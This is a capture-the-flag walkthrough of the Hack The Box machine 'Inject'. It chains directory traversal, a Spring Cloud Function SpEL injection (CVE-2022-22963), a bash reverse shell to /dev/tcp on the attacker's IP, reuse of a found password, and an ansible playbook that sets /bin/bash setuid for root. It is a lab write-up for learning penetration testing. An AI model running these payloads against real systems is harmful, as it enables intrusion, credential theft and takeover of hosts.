<h2> Target: 10.10.11.204 Inject</h2>

<b> Initial Access: </b><br>

Step 1: nmap -Pn -p- --min-rate=5000 10.10.11.204 | grep open | awk -F '/' '{print $1}' | tr '\n' ','  <br>
Nmap shows we have open ports: 22,8080

Step 2: Enumerating these open ports further with nmap: <br>
nmap -Pn --min-rate=5000 10.10.11.204 -p 22,8080 -sC -sV -oN nmap.inject

![image](https://user-images.githubusercontent.com/93153300/233364325-eb4abb27-8252-4c03-ade2-de27c277325e.png)

Step 3: In order to refer to the target by a name instead of a number, add into /etc/hosts file the following line: 10.10.11.204  inject.htb

Step 4: Navigating to port 8080 shows:

![image](https://user-images.githubusercontent.com/93153300/233364387-0ab4561c-0a92-4040-b969-05ece04575aa.png)

Click on ‘Upload’ (top right corner of the site).  The page navigates to http://inject.htb:8080/upload:

![image](https://user-images.githubusercontent.com/93153300/233364442-c18475eb-ec92-402d-afc7-6141181938b0.png)

Step 5: Upload a picture and then click on ‘View your image’.  The page navigates to: http://inject.htb:8080/show_image?img=avatar.jpeg 

Step 6: Capture the request in burp suite and check if we can get directory traversal by replacing ‘avatar.jpeg’ with ‘../../../../../../../etc/passwd’: 

![image](https://user-images.githubusercontent.com/93153300/233364477-6f1db5aa-570a-4720-869b-0f5a57efea9e.png)

We see the directory traversal is successful, as the /etc/passwd file is shown in the response.  

Step 7: Using directory traversal, look around to see what files we have (start simple with just ‘/show_image?img=/../’).  Eventually we find a file called ‘pom.xml’ that says we are using spring framework:

![image](https://user-images.githubusercontent.com/93153300/233364529-4c515266-27a7-4cb9-80b6-db2a40cc62da.png)

Step 8: Google search ‘spring exploit’.  Google shows 2 different spring rce exploits (CVE 2022-22965 and CVE 2022-22963).   In our case, the application is not vulnerable to CVE 22965, but it is vulnerable to CVE 22963.   

*For those interested in understanding how to know which vulnerability is the right one: A little research on google shows that CVE 22965 requires the application to run apache tomcat as a war deployment, while CVE 22963 deals with spring cloud (For further reading: https://www.fastly.com/blog/spring-has-sprung-breaking-down-cve-2022-22963-and-spring4shell-cve-2022 ).  The ‘pom.xml’ file we traversed to mentions spring cloud 3.2.2 (which is a vulnerable version), it does not mention apache tomcat deployed as a war file.  

*Background: The spring cloud rce payload is found on numerous sites.  It works by sending a post request to /functionRouter and adding the header spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("cmd").  Their is a metasploit module for this exploit ‘exploit/multi/http/spring_cloud_function_spel_injection’, I will show the manual way of doing this.  Issuing a reverse shell command doesn’t work, so we will upload a shell to the target and then execute it to get a reverse shell.  

Step 9: Create a file named ‘test’ containing a reverse shell payload:  bash -c "bash -i >& /dev/tcp/10.10.14.101/443 0>&1"

Step 10: Open a python web server: python3 -m http.server 80

Step 11: In burp suite, enter the following and then send the request:

![image](https://user-images.githubusercontent.com/93153300/233364565-28925709-b5bd-4066-8b05-17a915e6b9d3.png)
   
*Ensure you are including the header of content-type: application/json, otherwise it will fail. The status 500 response is expected for this exploit, the command is working.  

Step 12: Change the command in burp suite to ‘chmod 777 /dev/shm/test’ and send the request:

![image](https://user-images.githubusercontent.com/93153300/233364611-7c7956e0-2d22-4796-a34e-e5afa0c6e9a1.png)

Step 13: Open a netcat/pwncat listener to catch the reverse shell: pwncat-cs -lp 443.

Step 14: Change the command in burp suite to ‘/dev/shm/test’ and send the request:

![image](https://user-images.githubusercontent.com/93153300/233364651-5b25f7f0-8de4-454e-9986-e530979b7009.png)

We have shell as user frank:





![image](https://user-images.githubusercontent.com/93153300/233364678-29b93e71-f6e4-4d86-9e82-cd9ddbe59af8.png)
___________________________________________________
<b>Lateral Movement: </b>

Step 1: On the target shell, navigate to the directory of /home/frank and run the command grep -ri password 2>/dev/null

Grep found a password in the file /home/frank/.m2/settings.xml:

![image](https://user-images.githubusercontent.com/93153300/233364750-ded9a3a3-0cc2-4ad1-8d71-bc2d32ee7072.png)

Step 2: Read the file /home/frank/.m2/settings.xml:

![image](https://user-images.githubusercontent.com/93153300/233364793-5266d1a5-0b69-42db-953a-b2927590a010.png)
 
The file contains username phil, password DocPhillovestoInject123 

Step 3: Run the command su phil .  When prompted for the password enter password DocPhillovestoInject123.

We have shell as user phil.  We can get the flag in /home/phil/user.txt.
___________________________________________________
<b>Privilege Escalation:</b>

Step 1: Upload pspy to the target and run pspy. Pspy shows that any .yml file in /opt/automation/tasks will be run by root using ansible:

![image](https://user-images.githubusercontent.com/93153300/233364835-a1c77f9e-9299-456f-af01-758a3e77a0a7.png)

Step 2: Google search ‘ansible privilege escalation’ shows how to create an ansible file to get privilege escalation.  

Step 3: Create a file called test.yml on our pc containing the content below:

- hosts: localhost<br>
  tasks:<br>
    - name: test<br>
      command: chmod 4755 /bin/bash

Step 4: Upload test.yml to the target to the directory /opt/automation/tasks/.  Then wait a few moments for the task to run.  After the task runs we can see that the /bin/bash permissions changed to a suid:

![image](https://user-images.githubusercontent.com/93153300/233364875-28bef604-dd81-4d3c-949f-eb5c6c4dbae5.png)

Step 5: Run /bin/bash -p.  We have shell as root.  We can get the flag in /root/root.txt
